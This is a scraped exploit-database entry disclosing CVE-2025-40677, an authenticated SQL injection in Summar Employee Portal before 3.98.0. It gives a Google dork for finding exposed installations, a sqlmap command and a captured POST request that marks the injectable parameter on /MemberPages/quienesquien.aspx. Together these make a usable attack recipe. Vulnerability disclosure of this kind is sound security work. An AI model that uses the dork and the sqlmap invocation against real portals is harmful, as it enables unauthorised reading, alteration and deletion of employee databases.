---
title: Summar Employee Portal  3.98.0 Authenticated SQL Injection
url: https://cxsecurity.com/issue/WLB-2025120018
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-12-17
fetch_date: 2025-12-18T03:19:28.623435
---

# Summar Employee Portal  3.98.0 Authenticated SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Summar Employee Portal 3.98.0 Authenticated SQL Injection** **2025.12.17**  Credit:  **[Peter Gabaldon](https://cxsecurity.com/author/Peter%2BGabaldon/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-40677](https://cxsecurity.com/cveshow/CVE-2025-40677/ "Click to see CVE-2025-40677")**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")**  **[**Dork:** inurl:"/MemberPages/quienesquien.aspx"](https://cxsecurity.com/dorks/)** | |

# Exploit Title: Summar Employee Portal 3.98.0 - Authenticated SQL Injection
# Google Dork: inurl:"/MemberPages/quienesquien.aspx"
# Date: 09/22/2025
# Exploit Author: Peter Gabaldon - https://pgj11.com/
# Vendor Homepage: https://www.summar.es/
# Software Link: https://www.summar.es/software-recursos-humanos/
# Version: < 3.98.0
# Tested on: Kali
# CVE: CVE-2025-40677
# Description: SQL injection vulnerability in Summar Software´s Portal del Empleado. This vulnerability allows an attacker to retrieve, create, update, and delete the database by sending a POST request using the parameter “ctl00$ContentPlaceHolder1$filtroNombre” in “/MemberPages/quienesquien.aspx”.
$ sqlmap --random-agent -r req.sqli.xml -p 'ctl00%24ContentPlaceHolder1%24filtroNombre' --dbms="MSSQL"
POST /MemberPages/quienesquien.aspx HTTP/1.1
Host: [REDACTED]
Cookie: [REDACTED]
User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: \*/\*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
X-Microsoftajax: Delta=true
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: keep-alive
ctl00%24ScriptManager1=ctl00%24ScriptManager1%7Cctl00%24ContentPlaceHolder1%24lnkVerTrabajador&ctl00%24ContentPlaceHolder1%24filtroNombre=[SQL\_INJECTION\_POINT]&ctl00%24ContentPlaceHolder1%24ddlEmpresa=&ctl00%24ContentPlaceHolder1%24filtroCentro=&ctl00%24ContentPlaceHolder1%24filtroUO=&ctl00%24ContentPlaceHolder1%24filtroPuesto=&\_\_EVENTTARGET=ctl00%24ContentPlaceHolder1%24lnkVerTrabajador&\_\_EVENTARGUMENT=&\_\_LASTFOCUS=&\_\_VIEWSTATE=...&\_\_VIEWSTATEGENERATOR=...&\_\_ASYNCPOST=true&

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025120018)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top